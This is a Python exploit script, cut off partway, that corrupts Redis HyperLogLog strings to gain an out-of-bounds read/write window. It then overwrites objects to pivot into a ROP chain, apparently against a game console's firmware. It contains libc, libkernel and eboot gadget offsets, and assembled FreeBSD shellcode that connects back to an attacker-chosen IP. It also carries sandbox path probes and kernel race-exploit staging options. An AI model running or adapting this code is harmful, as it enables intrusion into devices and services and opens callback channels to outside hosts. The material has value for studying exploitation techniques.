#!/usr/bin/env python3
"""
Pre-spray Redis module-object pivot through the HLL SDS_TYPE_32 window.

This variant avoids allocating marker/module/stack objects after B is
corrupted.  It lays out B, pre-sprays all helper objects, opens the oversized
B read/write window, resolves the pre-sprayed object data addresses via
markers inside B, then overwrites one victim robj as a module object.
"""
import argparse
import os
import socket
import struct
import time

import redis_hll_guarded_probe as hll


DEFAULT_RAW_SIZE = 0x100
DEFAULT_CTX_SIZE = 0x200
DEFAULT_STACK_SIZE = 0x800
MARKER_AT = 0x40
PAGE_SIZE = 0x4000
SANDBOX_PROBE_MAGIC = b"SBOXP1!\x00"
SANDBOX_PROBE_RECORD_SIZE = 0x80
SANDBOX_PROBE_HEADER_SIZE = 0x80
DEFAULT_SANDBOX_PROBE_PATHS = [
    "/",
    "/system",
    "/system_ex",
    "/system_ex/app",
    "/system_ex/app/NPXS40140/TA_AACS.sbin",
    "/dev",
    "/dev/notification0",
    "/dev/mp3",
    "/dev/encdec",
    "/dev/dmem0",
    "/data",
    "/mnt",
    "/mnt/usb0",
    "/preinst",
    "/system_tmp",
    "/sandbox",
    "/user",
    "/download0",
]

LIBC_PIVOT_MOV_RSP_RDI38_POP_RDI_RET = 0x4136E
LIBC_MOV_R8_R14_CALL_PTR_RAX48 = 0x91C4D
LIBC_POP_RDI_RET = 0x41372
LIBC_POP_RSI_RET = 0x46708
LIBC_POP_RDX_POP_RBP_RET = 0x4ABBE
LIBC_MEMCPY_EXPORT = 0x3AD0
LIBC_GETPID_GOT = 0x1280C0
LIBC_GETTIMEOFDAY_GOT = 0x128198
LIBC_SETCONTEXT = 0x412F8
LIBC_SAVECONTEXT = 0x41374
LIBC_LONGJMP = 0x58FD0
LIBKERNEL_GETPID = 0x410
LIBKERNEL_GETTIMEOFDAY = 0x9D0
LIBKERNEL_SEND_EXPORT = 0x12660
LIBKERNEL_MPROTECT = 0x730
LIBKERNEL_ERRNO_PTR = 0x2D70
LIBKERNEL_GET_MODULE_HANDLE = 0x17B0
LIBKERNEL_DYNLIB_DLSYM = 0x1A30
LIBKERNEL_DYNLIB_GET_LIST = 0x1A90
LIBKERNEL_SELF_INFO_PTR = 0x780F0
LIBKERNEL_MODULE_COUNT = 0x60168
LIBKERNEL_MODULE_ACTIVE = 0x78268
LIBKERNEL_MODULE_TABLE = 0x78270
LIBKERNEL_SYS_MPROTECT = 0x900
LIBKERNEL_SYS_GETPID = 0x500
LIBKERNEL_SYS_GETTIMEOFDAY = 0xBE0
LIBKERNEL_SYS_UMTX_OP = 0x1A60
LIBKERNEL_SYS_FSTAT = 0x8C0
LIBKERNEL_SYS_CLOSE = 0x3460
LIBKERNEL_SYS_FTRUNCATE = 0x3700
LIBKERNEL_SYS_ERRNO_PTR = 0x3980
LIBKERNEL_SYS_GET_MODULE_HANDLE = 0x2100
LIBKERNEL_SYS_DYNLIB_DLSYM = 0x24A0
LIBKERNEL_SYS_DYNLIB_GET_LIST = 0x2500
LIBKERNEL_SYS_SELF_INFO_PTR = 0x781F0
LIBKERNEL_SYS_MODULE_COUNT = 0x60168
LIBKERNEL_SYS_MODULE_ACTIVE = 0x78368
LIBKERNEL_SYS_MODULE_TABLE = 0x78370
LIBKERNEL_SYS_SEND_EXPORT = 0x13270
LIBKERNEL_SYS_SEND_GOT_TARGET = 0x132D0
LIBKERNEL_SYS_SEND_TO_MPROTECT_DELTA = LIBKERNEL_SYS_SEND_EXPORT - LIBKERNEL_SYS_MPROTECT
LIBKERNEL_MODULE_STRIDE = 0x98
LIBKERNEL_MODULE_TABLE_FIELDS = (0x10, 0x18, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70)

REDIS_EBOOT_POP_RDI_RET = 0x8DF88
REDIS_EBOOT_POP_RSI_RET = 0x2341D
REDIS_EBOOT_POP_RDX_RET3 = 0x9E942
REDIS_EBOOT_POP_RCX_RET = 0x52F57
REDIS_EBOOT_POP_RAX_RET = 0x37A11
REDIS_EBOOT_POP_R8_PAD_RET = 0x6E8DE
REDIS_EBOOT_POP_R14_RET = 0x2341C
REDIS_EBOOT_POP_RSP_RET = 0x22F5E
REDIS_EBOOT_XCHG_ESP_EAX_RET = 0x6055
REDIS_EBOOT_XCHG_EDI_EAX_RET = 0x8BE8D
REDIS_EBOOT_MOV_RAX_PTR_RDI_RET = 0x3C78A
REDIS_EBOOT_MOV_RAX_PTR_RAX_RET = 0x3D2A9
REDIS_EBOOT_MOV_PTR_RDI_RAX_RET = 0x56CB
REDIS_EBOOT_MOV_DWORD_PTR_RDI_EAX_RET = 0x56CC
REDIS_EBOOT_MOV_RDI_RAX_PAD_RET = 0x37264
REDIS_EBOOT_MOV_RSI_RDI_TEST_EDX_POP_RBP_RET = 0x4EABF
REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET = 0x2C64B
REDIS_EBOOT_ADD_RAX_RDX_RET = 0x36812
REDIS_EBOOT_MOV_RCX_RAX_RET = 0x83FE1
REDIS_EBOOT_JMP_RCX = 0x142A
REDIS_EBOOT_CALL_RAX = 0x41
REDIS_EBOOT_PUSH_RAX_RET = 0x58C2
REDIS_EBOOT_MEMCPY_GOT = 0x125F58
REDIS_EBOOT_GETPID_GOT = 0x125FC8
REDIS_EBOOT_GETTIMEOFDAY_GOT = 0x126010
REDIS_EBOOT_SEND_GOT = 0x126538
REDIS_EBOOT_MEMCPY_PLT = 0xDAB70
REDIS_EBOOT_DLSYM_PLT = 0xDB250
REDIS_EBOOT_OPEN_PLT = 0xDAC60
REDIS_EBOOT_WRITE_PLT = 0xDAC70
REDIS_EBOOT_CLOSE_PLT = 0xDAC80
REDIS_EBOOT_SEND_PLT = 0xDB730
REDIS_EBOOT_RET_IMM_BY_MOD = {
    0: (0x6FC1, 0),
    1: (0xA83C, 1),
    2: (0x1D193, 2),
    3: (0x473D7, 3),
    4: (0x2A40F, 4),
    5: (0x7EBE6, 5),
    6: (0xB3EE, 6),
    7: (0x3EBA, 7),
    8: (0x1F57B, 8),
    9: (0x3E979, 9),
    10: (0x408E4, 10),
    11: (0x1E89E, 11),
    12: (0x6B08F, 12),
    13: (0xC4E0A, 349),
    14: (0x1106, 14),
    15: (0x806A, 79),
}

FW_PROFILES = {
    "250": {
        "dispatch_func_offsets": {
            "c24f0": 0xC24F0,
            "c1900": 0xC1900,
            "c5500": 0xC5500,
        },
        "dispatch_target_offset": 0xC1ACB,
    },
    "300": {
        "dispatch_func_offsets": {
            "c24f0": 0xD39A0,
            "c1900": 0xD2E70,
            "c1970": 0xD2EE0,
        },
        # No safe/default target for 3.00 yet. Force callers to pass an
        # explicit --dispatch-target or --dispatch-target-offset.
        "dispatch_target_offset": None,
    },
}


def apply_fw_profile(args):
    profile = FW_PROFILES[args.fw]
    if args.dispatch_func_offset is None:
        offsets = profile["dispatch_func_offsets"]
        if args.dispatch_mode not in offsets:
            known = ", ".join(sorted(offsets))
            raise RuntimeError(
                f"firmware {args.fw} has no vetted offset for dispatch mode "
                f"{args.dispatch_mode!r}; known modes: {known}"
            )
        args.dispatch_func_offset = offsets[args.dispatch_mode]
    if args.dispatch_target is None and args.dispatch_target_offset is None:
        args.dispatch_target_offset = profile["dispatch_target_offset"]
    if args.chain == "dispatch-crash" and args.dispatch_target is None and args.dispatch_target_offset is None:
        raise RuntimeError(
            f"firmware {args.fw} dispatch mode {args.dispatch_mode!r} needs "
            "--dispatch-target or --dispatch-target-offset"
        )


def k(prefix, name):
    return f"{prefix}:{name}"


def marker_for(role):
    return b"CXRP" + role.encode("ascii")[:4].ljust(4, b"_") + struct.pack("<I", os.getpid())


def raw_marker_value(role, idx, size=DEFAULT_RAW_SIZE):
    marker = marker_for(role)
    value = bytearray((role[:1].encode("ascii") or b"R") * size)
    value[MARKER_AT:MARKER_AT + len(marker)] = marker
    struct.pack_into("<I", value, MARKER_AT + len(marker), idx)
    return bytes(value)


def find_presprayed_raw(sock, b_key, b_sds, window, scan_size, prefix, role):
    marker = marker_for(role)
    marker_off = hll.find_marker_offset(sock, b_key, marker, hll.SZ, min(window, scan_size))
    if marker_off is None:
        raise RuntimeError(f"could not locate {role} marker in B window")
    idx_raw = hll.cmd(
        sock,
        "GETRANGE",
        b_key,
        str(marker_off + len(marker)),
        str(marker_off + len(marker) + 3),
        timeout=60,
    )
    if not isinstance(idx_raw, bytes) or len(idx_raw) != 4:
        raise RuntimeError(f"could not read {role} marker index")
    idx = struct.unpack("<I", idx_raw)[0]
    name = k(prefix, f"pv_{role}{idx:04d}")
    robj, _dbg = hll.debug_object_addr(sock, name)
    marker_data_addr = b_sds + marker_off - MARKER_AT
    data_addr = marker_data_addr
    robj_off = robj - b_sds
    if 0 <= robj_off <= window - 16:
        raw = hll.cmd(
            sock,
            "GETRANGE",
            b_key,
            str(robj_off),
            str(robj_off + 15),
            timeout=60,
        )
        if isinstance(raw, bytes) and len(raw) == 16:
            parsed = hll.parse_robj(raw)
            ptr = parsed.get("ptr") if isinstance(parsed, dict) else None
            if isinstance(ptr, int) and ptr != 0:
                data_addr = ptr
    print(
        f"[prespray] {role} idx={idx} key={name} robj=0x{robj:X} "
        f"marker_off=0x{marker_off:X} data=0x{data_addr:X}"
        + ("" if data_addr == marker_data_addr else f" marker_data=0x{marker_data_addr:X}")
    )
    return name, data_addr, robj


def find_victim_and_b_sds(sock, b_key, window, scan_size, prefix):
    marker = marker_for("addr")
    marker_off = hll.find_marker_offset(sock, b_key, marker, hll.SZ, min(window, scan_size))
    if marker_off is None:
        raise RuntimeError("could not locate address marker in B window")
    idx_raw = hll.cmd(
        sock,
        "GETRANGE",
        b_key,
        str(marker_off + len(marker)),
        str(marker_off + len(marker) + 3),
        timeout=60,
    )
    if not isinstance(idx_raw, bytes) or len(idx_raw) != 4:
        raise RuntimeError("could not read address marker index")
    idx = struct.unpack("<I", idx_raw)[0]
    victim_key = k(prefix, f"pv_addr{idx:04d}")
    victim_robj, _dbg = hll.debug_object_addr(sock, victim_key)

    # The address marker objects are intentionally embstr-sized.  On this Redis
    # build their string bytes start at robj+19, which lets us anchor B_sds.
    marker_abs = victim_robj + 19
    b_sds = marker_abs - marker_off
    print(
        f"[prespray] victim idx={idx} key={victim_key} robj=0x{victim_robj:X} "
        f"marker_off=0x{marker_off:X} B_sds=0x{b_sds:X}"
    )
    return victim_key, victim_robj, b_sds


def candidate_deltas(span):
    yield 0
    step = 4
    while step <= span:
        yield -step
        yield step
        step += 4


def register_value_order(bruteforce=False):
    if not bruteforce:
        return (3, 2)
    out = []
    # Try values whose low bits already look like useful SDS types first,
    # then fall back to the full six-bit HLL register value space.  Depending
    # on byte/bit alignment the value written into the target flags byte is
    # not necessarily equal to the requested SDS type.
    for low in (3, 2, 1, 4, 0, 5, 6, 7):
        for upper in range(8):
            v = low | (upper << 3)
            if v not in out:
                out.append(v)
    for v in range(64):
        if v not in out:
            out.append(v)
    return tuple(out)


def write_flags_preserved_c(sock, prefix, flags_reg, sds_type, tag):
    hll.cmd(sock, "DEL", k(prefix, "C"), timeout=30)
    hll_value = hll.make_hll(flags_reg, sds_type)
    return hll.trigger_hll(sock, prefix, hll_value, tag)


def open_b_window(sock, prefix, base_flags_reg, span, bruteforce_values=False, prime_c=True):
    b_key = k(prefix, "B")
    seen = set()
    values = register_value_order(bruteforce_values)
    attempts = 0
    for delta in candidate_deltas(span):
        reg = base_flags_reg + delta
        for reg_value in values:
            attempts += 1
            key_try = (reg, reg_value)
            if key_try in seen:
                continue
            seen.add(key_try)
            try:
                if prime_c:
                    hll.write_flags(sock, prefix, reg, reg_value, f"flags{reg}_{reg_value}")
                else:
                    write_flags_preserved_c(sock, prefix, reg, reg_value, f"flags{reg}_{reg_value}")
                window = hll.cmd(sock, "STRLEN", b_key, timeout=60)
            except Exception as exc:
                print(f"  window try reg={reg} value={reg_value} failed: {exc}")
                msg = str(exc).lower()
                if (
                    "connection closed" in msg
                    or "connection reset" in msg
                    or "connection aborted" in msg
                    or "10053" in msg
                    or "10054" in msg
                ):
                    raise RuntimeError("connection lost while opening B window") from exc
                continue
            if window != hll.SZ or attempts == 1 or (bruteforce_values and attempts % 128 == 0):
                print(f"  window try reg={reg} value={reg_value} STRLEN(B)={window}")
            if isinstance(window, int) and window > hll.SZ + 0x1000:
                return reg, reg_value, window
    raise RuntimeError("B did not inflate")


def pack64(v):
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def pack32(v):
    return struct.pack("<I", v & 0xFFFFFFFF)


def patch_rel32(buf, patch_at, src_next, dst):
    rel = dst - src_next
    if not -(1 << 31) <= rel < (1 << 31):
        raise ValueError(f"rel32 out of range: src_next=0x{src_next:X} dst=0x{dst:X}")
    buf[patch_at:patch_at + 4] = struct.pack("<i", rel)


def dispatch_arg2_ptr(args, stack_addr):
    if getattr(args, "dispatch_arg2_stack_offset", None) is not None:
        off = args.dispatch_arg2_stack_offset
        return stack_addr + off, f"stack+0x{off:X}"
    if getattr(args, "dispatch_arg2_stack", False):
        return stack_addr, "stack_addr"
    return args.dispatch_arg2, "literal"


def build_callback_shellcode(callback_ip, callback_port, message):
    """x86_64 FreeBSD userland shellcode: socket/connect/write/close/exit."""
    msg = message.encode("utf-8", errors="replace")
    if not msg.endswith(b"\n"):
        msg += b"\n"
    sockaddr = (
        bytes([16, 2])
        + struct.pack(">H", callback_port & 0xFFFF)
        + socket.inet_aton(callback_ip)
        + b"\x00" * 8
    )

    code = bytearray()
    patches = []

    def emit(b):
        code.extend(b)

    def lea_rsi(label):
        pos = len(code)
        emit(b"\x48\x8D\x35" + b"\x00\x00\x00\x00")  # lea rsi, [rip+rel32]
        patches.append((pos + 3, len(code), label))

    # fd = socket(AF_INET, SOCK_STREAM, 0)
    emit(b"\x31\xD2")                    # xor edx, edx
    emit(b"\xBF" + pack32(2))             # mov edi, AF_INET
    emit(b"\xBE" + pack32(1))             # mov esi, SOCK_STREAM
    emit(b"\xB8" + pack32(97))            # mov eax, SYS_socket
    emit(b"\x0F\x05")                    # syscall
    emit(b"\x49\x89\xC4")                # mov r12, rax

    # connect(fd, &sockaddr, 16)
    emit(b"\x4C\x89\xE7")                # mov rdi, r12
    lea_rsi("sockaddr")
    emit(b"\xBA" + pack32(16))            # mov edx, 16
    emit(b"\xB8" + pack32(98))            # mov eax, SYS_connect
    emit(b"\x0F\x05")                    # syscall

    # write(fd, msg, len)
    emit(b"\x4C\x89\xE7")                # mov rdi, r12
    lea_rsi("msg")
    emit(b"\xBA" + pack32(len(msg)))      # mov edx, len
    emit(b"\xB8" + pack32(4))             # mov eax, SYS_write
    emit(b"\x0F\x05")                    # syscall

    # close(fd)
    emit(b"\x4C\x89\xE7")                # mov rdi, r12
    emit(b"\xB8" + pack32(6))             # mov eax, SYS_close
    emit(b"\x0F\x05")                    # syscall

    # exit(0)
    emit(b"\x31\xFF")                    # xor edi, edi
    emit(b"\xB8" + pack32(1))             # mov eax, SYS_exit
    emit(b"\x0F\x05")                    # syscall

    labels = {
        "sockaddr": len(code),
    }
    emit(sockaddr)
    labels["msg"] = len(code)
    emit(msg)

    for patch_at, src_next, label in patches:
        patch_rel32(code, patch_at, src_next, labels[label])

    return bytes(code)


def build_stack_value(args, stack_addr):
    stack_size = args.stack_size
    stack_arg = args.stack_arg
    stack_ret = args.stack_ret
    if getattr(args, "stack_arg_stack_offset", None) is not None:
        stack_arg = stack_addr + args.stack_arg_stack_offset
    if getattr(args, "stack_ret_stack_offset", None) is not None:
        stack_ret = stack_addr + args.stack_ret_stack_offset
    lowrop_notify = getattr(args, "stack_lowrop_notify", False)
    lowrop_dlsym_probe = getattr(args, "stack_lowrop_dlsym_probe", False)
    lowrop_module_dlsym_probe = getattr(args, "stack_lowrop_module_dlsym_probe", False)
    lowrop_module_table_leak = getattr(args, "stack_lowrop_module_table_leak", False)
    lowrop_dynlib_list_probe = getattr(args, "stack_lowrop_dynlib_list_probe", False)
    lowrop_self_dlsym_probe = getattr(args, "stack_lowrop_self_dlsym_probe", False)
    lowrop_self_info_leak = getattr(args, "stack_lowrop_self_info_leak", False)
    lowrop_mprotect_probe = getattr(args, "stack_lowrop_mprotect_probe", False)
    lowrop_indirect_send_probe = getattr(args, "stack_lowrop_indirect_send_probe", False)
    lowrop_eboot_getpid_probe = getattr(args, "stack_lowrop_eboot_getpid_probe", False)
    lowrop_eboot_gettimeofday_probe = getattr(args, "stack_lowrop_eboot_gettimeofday_probe", False)
    lowrop_eboot_mprotect_probe = getattr(args, "stack_lowrop_eboot_mprotect_probe", False)
    lowrop_libc_getpid_probe = getattr(args, "stack_lowrop_libc_getpid_probe", False)
    lowrop_libc_gettimeofday_probe = getattr(args, "stack_lowrop_libc_gettimeofday_probe", False)
    lowrop_wrapper_call_probe = getattr(args, "stack_lowrop_wrapper_call_probe", False)
    lowrop_direct_syscall_probe = getattr(args, "stack_lowrop_direct_syscall_probe", False)
    lowrop_code_read_probe = getattr(args, "stack_lowrop_code_read_probe", False)
    lowrop_sandbox_probe = getattr(args, "stack_lowrop_sandbox_probe", False)
    lowrop_umtx2_preflight = getattr(args, "stack_lowrop_umtx2_preflight", False)
    lowrop_umtx2_wrapper_preflight = getattr(args, "stack_lowrop_umtx2_wrapper_preflight", False)
    lowrop_umtx2_race_one = getattr(args, "stack_lowrop_umtx2_race_one", False)
    lowrop_umtx2_preserve_lookup_fd = getattr(args, "lowrop_umtx2_preserve_lookup_fd", False)
    lowrop_umtx2_spray_existing = getattr(args, "stack_lowrop_umtx2_spray_existing", False)
    lowrop_umtx2_map_existing = getattr(args, "stack_lowrop_umtx2_map_existing", False)
    lowrop_lapse_preflight = getattr(args, "stack_lowrop_lapse_preflight", False)
    lowrop_lapse_thread_preflight = getattr(args, "stack_lowrop_lapse_thread_preflight", False)
    lowrop_lapse_worker_preflight = getattr(args, "stack_lowrop_lapse_worker_preflight", False)
    lowrop_lapse_suspend_preflight = getattr(args, "stack_lowrop_lapse_suspend_preflight", False)
    lowrop_lapse_race_one = getattr(args, "stack_lowrop_lapse_race_one", False)
    lowrop_lapse_rthdr_preflight = getattr(args, "stack_lowrop_lapse_rthdr_preflight", False)
    lowrop_lapse_race_rthdr = getattr(args, "stack_lowrop_lapse_race_rthdr", False)
    lowrop_lapse_rthdr_count = max(1, min(getattr(args, "lowrop_lapse_rthdr_count", 1), 16))
    lowrop_lapse_rthdr_set_loops = max(1, min(getattr(args, "lowrop_lapse_rthdr_set_loops", 1), 64))
    lowrop_lapse_rthdr_skip_reclaim = bool(getattr(args, "lowrop_lapse_rthdr_skip_reclaim", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_rthdr_per_socket_setbuf = (
        bool(getattr(args, "lowrop_lapse_rthdr_per_socket_setbuf", False))
        and lowrop_lapse_race_rthdr
    )
    lowrop_lapse_rthdr_segment_floor = max(
        0x2D40,
        min(getattr(args, "lowrop_lapse_rthdr_segment_floor", 0x2D80), 0x3200),
    )
    lowrop_lapse_target_req_index = max(0, min(getattr(args, "lowrop_lapse_target_req_index", 2), 2))
    lowrop_lapse_post_resume_yields = max(0, min(getattr(args, "lowrop_lapse_post_resume_yields", 8), 64))
    lowrop_lapse_post_resume_sleep_ns = max(0, min(getattr(args, "lowrop_lapse_post_resume_sleep_ns", 0), 1_000_000_000))
    lowrop_lapse_pre_suspend_sleep_ns = max(0, min(getattr(args, "lowrop_lapse_pre_suspend_sleep_ns", 0), 1_000_000_000))
    lowrop_lapse_pre_barrier_yields = max(0, min(getattr(args, "lowrop_lapse_pre_barrier_yields", 0), 4))
    lowrop_lapse_pre_barrier_sleep_ns = max(0, min(getattr(args, "lowrop_lapse_pre_barrier_sleep_ns", 0), 1_000_000_000))
    lowrop_lapse_pre_barrier_getpid_loops = max(
        0,
        min(
            getattr(args, "lowrop_lapse_pre_barrier_getpid_loops", 0),
            max(0, 4 - lowrop_lapse_pre_barrier_yields - (1 if lowrop_lapse_pre_barrier_sleep_ns else 0)),
        ),
    )
    lowrop_lapse_pre_barrier_rop_nops = max(0, min(getattr(args, "lowrop_lapse_pre_barrier_rop_nops", 0), 2048))
    lowrop_lapse_pre_suspend_rop_nops = max(0, min(getattr(args, "lowrop_lapse_pre_suspend_rop_nops", 0), 1024))
    lowrop_lapse_post_poll_rop_nops = max(0, min(getattr(args, "lowrop_lapse_post_poll_rop_nops", 0), 1024))
    lowrop_lapse_post_poll_yields = max(0, min(getattr(args, "lowrop_lapse_post_poll_yields", 0), 8))
    lowrop_lapse_post_resume_rop_nops = max(0, min(getattr(args, "lowrop_lapse_post_resume_rop_nops", 0), 2048))
    lowrop_lapse_client_fill_len = max(0, min(getattr(args, "lowrop_lapse_client_fill_len", 0), 0x10000))
    lowrop_lapse_sockbuf_size = max(0, min(getattr(args, "lowrop_lapse_sockbuf_size", 0), 0x100000))
    lowrop_lapse_conn_drain_len = max(0, min(getattr(args, "lowrop_lapse_conn_drain_len", 0), 0x200))
    lowrop_lapse_pre_suspend_getpid_loops = max(0, min(getattr(args, "lowrop_lapse_pre_suspend_getpid_loops", 0), 16))
    lowrop_lapse_worker_ack = bool(getattr(args, "lowrop_lapse_worker_ack", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_worker_ack_poll_ms = (
        max(0, min(getattr(args, "lowrop_lapse_worker_ack_poll_ms", 0), 1000))
        if lowrop_lapse_race_rthdr
        else 0
    )
    lowrop_lapse_worker_ready_pipe = (
        bool(getattr(args, "lowrop_lapse_worker_ready_pipe", False))
        and lowrop_lapse_race_rthdr
        and not lowrop_lapse_worker_ack
        and lowrop_lapse_worker_ack_poll_ms == 0
    )
    lowrop_lapse_uses_ack_pipe = (
        lowrop_lapse_worker_ack
        or lowrop_lapse_worker_ready_pipe
        or lowrop_lapse_worker_ack_poll_ms > 0
    )
    lowrop_lapse_uses_ack_signal = lowrop_lapse_worker_ack or lowrop_lapse_worker_ack_poll_ms > 0
    lowrop_lapse_worker_ready_ack = (
        bool(getattr(args, "lowrop_lapse_worker_ready_ack", False))
        and lowrop_lapse_race_rthdr
        and not lowrop_lapse_worker_ack
        and not lowrop_lapse_uses_ack_signal
        and not lowrop_lapse_worker_ready_pipe
    )
    lowrop_lapse_worker_after_read_ack = (
        bool(getattr(args, "lowrop_lapse_worker_after_read_ack", False))
        and lowrop_lapse_race_rthdr
        and not lowrop_lapse_worker_ack
        and not lowrop_lapse_uses_ack_signal
        and not lowrop_lapse_worker_ready_pipe
        and not lowrop_lapse_worker_ready_ack
    )
    if lowrop_lapse_worker_after_read_ack:
        lowrop_lapse_uses_ack_pipe = True
    lowrop_lapse_worker_park = bool(getattr(args, "lowrop_lapse_worker_park", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_pre_reclaim_send = bool(getattr(args, "lowrop_lapse_pre_reclaim_send", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_post_reclaim_send = bool(getattr(args, "lowrop_lapse_post_reclaim_send", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_post_main_delete_send = bool(getattr(args, "lowrop_lapse_post_main_delete_send", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_pre_delete_send = bool(getattr(args, "lowrop_lapse_pre_delete_send", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_tcpinfo_before_poll = bool(getattr(args, "lowrop_lapse_tcpinfo_before_poll", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_debug_sends = bool(getattr(args, "lowrop_lapse_debug_sends", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_after_ack_send = bool(getattr(args, "lowrop_lapse_after_ack_send", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_block_workers = bool(getattr(args, "lowrop_lapse_block_workers", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_prezero_r9_once = (
        bool(getattr(args, "lowrop_lapse_prezero_r9_once", False))
        and (lowrop_lapse_race_rthdr or lowrop_lapse_rthdr_preflight)
    )
    lowrop_lapse_skip_rthdr_optlen_store = (
        bool(getattr(args, "lowrop_lapse_skip_rthdr_optlen_store", False))
        and lowrop_lapse_race_rthdr
    )
    lowrop_lapse_block_worker_count = (
        max(1, min(getattr(args, "lowrop_lapse_block_worker_count", 2), 2))
        if lowrop_lapse_block_workers
        else 0
    )
    lowrop_lapse_pre_suspend_yield = bool(getattr(args, "lowrop_lapse_pre_suspend_yield", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_pre_suspend_yields = (
        max(
            0,
            min(
                getattr(
                    args,
                    "lowrop_lapse_pre_suspend_yields",
                    1 if lowrop_lapse_pre_suspend_yield else 0,
                ),
                16,
            ),
        )
        if lowrop_lapse_race_rthdr
        else 0
    )
    lowrop_lapse_main_prio_pin = bool(getattr(args, "lowrop_lapse_main_prio_pin", False)) and lowrop_lapse_race_rthdr
    lowrop_lapse_cpuset_size = max(8, min(getattr(args, "lowrop_lapse_cpuset_size", 8), 0x80))

    def lapse_rthdr_layout(count, sds_off=0x3300, extra_segments=0, set_loops=1, segment_floor=None):
        def align(value, mask):
            return (value + mask) & ~mask

        set_loops = max(1, set_loops)
        segment_stride = 0x60 if lowrop_lapse_race_rthdr else 0x80
        set_ret_off = align(sds_off + count * 8, 0x3F)
        get_ret_off = align(set_ret_off + count * 8, 0x3F)
        marker_off = align(get_ret_off + count * 8, 0x3F)
        optlen_off = align(marker_off + count * 8, 0x3F)
        rthdr_buf_off = align(optlen_off + count * 8, 0x7F)
        getbuf_off = rthdr_buf_off + 0x80
        segment_off = align(getbuf_off + count * 0x80, 0x7F)
        if segment_floor is not None:
            segment_off = max(segment_off, segment_floor)
        segment_count = count + count * set_loops + count + extra_segments
        msg_len = align(segment_off + segment_count * segment_stride + 0x80, 0x7F)
        return {
            "sds_off": sds_off,
            "set_ret_off": set_ret_off,
            "get_ret_off": get_ret_off,
            "marker_off": marker_off,
            "optlen_off": optlen_off,
            "rthdr_buf_off": rthdr_buf_off,
            "getbuf_off": getbuf_off,
            "segment_off": segment_off,
            "segment_stride": segment_stride,
            "msg_len": msg_len,
            "segment_count": segment_count,
        }
    if (
        getattr(args, "stack_lowrop_send", False)
        or getattr(args, "stack_lowrop_got_leak", False)
        or lowrop_notify
        or lowrop_dlsym_probe
        or lowrop_module_dlsym_probe
        or lowrop_module_table_leak
        or lowrop_dynlib_list_probe
        or lowrop_self_dlsym_probe
        or lowrop_self_info_leak
        or lowrop_mprotect_probe
        or lowrop_indirect_send_probe
        or lowrop_eboot_getpid_probe
        or lowrop_eboot_gettimeofday_probe
        or lowrop_eboot_mprotect_probe
        or lowrop_libc_getpid_probe
        or lowrop_libc_gettimeofday_probe
        or lowrop_wrapper_call_probe
        or lowrop_direct_syscall_probe
        or lowrop_code_read_probe
        or lowrop_sandbox_probe
        or lowrop_umtx2_preflight
        or lowrop_umtx2_wrapper_preflight
        or lowrop_umtx2_race_one
        or lowrop_umtx2_spray_existing
        or lowrop_umtx2_map_existing
        or lowrop_lapse_preflight
        or lowrop_lapse_thread_preflight
        or lowrop_lapse_worker_preflight
        or lowrop_lapse_suspend_preflight
        or lowrop_lapse_race_one
        or lowrop_lapse_rthdr_preflight
        or lowrop_lapse_race_rthdr
    ):
        if args.eboot_base is None:
            raise RuntimeError("lowrop mode needs --eboot-base")
        if getattr(args, "dispatch_fd", None) is None:
            raise RuntimeError("lowrop mode needs --dispatch-arg-sidecar-fd or --dispatch-arg-client-fd")

        scratch = args.eboot_base + args.lowrop_scratch_offset
        vtable = scratch + args.lowrop_vtable_offset
        chain_addr = scratch + args.lowrop_chain_offset
        external_msg = bool(getattr(args, "lowrop_external_msg", False))
        external_msg_addr = getattr(args, "lowrop_external_msg_addr", None)
        if external_msg:
            if external_msg_addr is None:
                raise RuntimeError("--lowrop-external-msg needs a resolved external message address")
            msg_addr = external_msg_addr
        else:
            msg_addr = scratch + args.lowrop_msg_offset
        copy_len = args.lowrop_copy_len
        pair_off = args.lowrop_pair_offset
        leak_offsets = None
        notify_size = 0
        notify_off = None
        path_off = None
        fd_slot_off = None
        icon_off = None
        text_off = None
        const_off = None
        dlsym_cases = None
        dlsym_symbol_off = None
        dlsym_out_off = None
        module_table_entries = 0
        dynlib_list_max = 0
        sandbox_paths = []
        mprotect_target_page = None
        mprotect_target_kind = getattr(args, "lowrop_mprotect_target", "scratch")
        path_blob = None
        icon_blob = None
        text_blob = None
        dlsym_blobs = None
        module_name_blobs = None
        if lowrop_notify:
            msg = args.lowrop_notify_done_msg.encode("ascii", errors="replace")
            if not msg.endswith(b"\n"):
                msg += b"\n"
            notify_size = 0xC30
            notify_off = args.lowrop_notify_offset
            path_off = args.lowrop_notify_path_offset
            fd_slot_off = args.lowrop_notify_fd_slot_offset
            icon_off = args.lowrop_notify_icon_offset
            text_off = args.lowrop_notify_text_offset
            const_off = args.lowrop_notify_const_offset
            path_blob = b"/dev/notification0\x00"
            icon_blob = b"cxml://psnotification/tex_icon_system\x00"
            text_blob = args.lowrop_notify_text.encode("utf-8", errors="replace")
            text_blob = text_blob[:0x3FF] + b"\x00"
        elif lowrop_dlsym_probe:
            dlsym_symbols = args.lowrop_dlsym_symbol or ["YQOfxL4QfeU#I#A", "YQOfxL4QfeU"]
            dlsym_handles = args.lowrop_dlsym_handle or [0, 1, 2, 0x2001, 0x2002, -1]
            dlsym_cases = [(handle, symbol) for handle in dlsym_handles for symbol in dlsym_symbols]
            msg = b"\x00" * (16 * len(dlsym_cases))
            dlsym_symbol_off = args.lowrop_dlsym_symbol_offset
            dlsym_out_off = args.lowrop_dlsym_out_offset
            dlsym_blobs = []
            cursor = dlsym_symbol_off
            for symbol in dlsym_symbols:
                blob = symbol.encode("ascii", errors="replace") + b"\x00"
                dlsym_blobs.append((symbol, cursor, blob))
                cursor = (cursor + len(blob) + 7) & ~7
        elif lowrop_module_dlsym_probe:
            module_names = args.lowrop_module_name or [
                "libkernel_sys.sprx",
